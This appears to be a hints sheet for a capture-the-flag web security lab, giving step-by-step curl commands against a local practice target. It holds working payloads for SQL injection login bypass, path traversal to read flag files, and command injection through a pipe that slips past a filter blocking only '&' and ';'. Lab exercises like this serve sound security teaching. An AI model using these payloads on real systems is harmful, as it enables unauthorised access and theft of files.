# Hints — Scenario H: Web Application Security

> Read one hint at a time. Try to solve it before moving to the next.
> Environment: `docker attach kali-appsec-lab`
> Target: `http://localhost:5000`

---

## Hint H1 — SQL Injection on /login

**Getting started:**
The login form sends `username` and `password` as POST parameters.
The server builds a SQL query directly from your input — no sanitisation.

Try causing a database error first to confirm it's vulnerable:
```bash
curl -s http://localhost:5000/login -d "username='&password=test"
```
If you see a `Database error` response with a `query` field — it's injectable.

**Going further:**
The query looks like:
```sql
SELECT ... WHERE username='INPUT' AND password='INPUT'
```
To bypass the password check, inject a comment that removes the `AND password=...` part.
SQL comment: `--` (dash dash space)

```bash
curl -s -X POST http://localhost:5000/login \
  --data-urlencode "username=admin'-- " \
  --data-urlencode "password=anything" | python3 -m json.tool
```
The flag is in the `notes` field of the admin user returned.

---

## Hint H2 — Path Traversal on /files

**Getting started:**
`/files?path=readme.txt` reads `/lab/data/readme.txt`.
The app prepends `/lab/data/` to your input but doesn't prevent `../` sequences.

Try reading a file one level up:
```bash
curl 'http://localhost:5000/files?path=../flags/flag2.txt'
```
The `content` field in the JSON response is the flag.

**If that doesn't work:**
Check what files are available first:
```bash
curl 'http://localhost:5000/files?path=readme.txt'
curl 'http://localhost:5000/files?path=notice.txt'
```
Then traverse up one directory to `/lab/flags/`.

---

## Hint H3 — Command Injection on /ping

**Getting started:**
`/ping?host=127.0.0.1` runs: `ping -c 2 127.0.0.1`
The app blocks `&` and `;` — but NOT the pipe `|` character.

Test that command injection works:
```bash
curl 'http://localhost:5000/ping?host=127.0.0.1|id'
```
If you see `uid=0(root)` in the output — it's injectable.

**Getting the flag:**
```bash
curl 'http://localhost:5000/ping?host=127.0.0.1|cat /lab/flags/flag3.txt'
```
The flag appears in the `output` field alongside any ping error messages.

**Submitting:**
```bash
check_flag 'NFCSOC{...}'
```
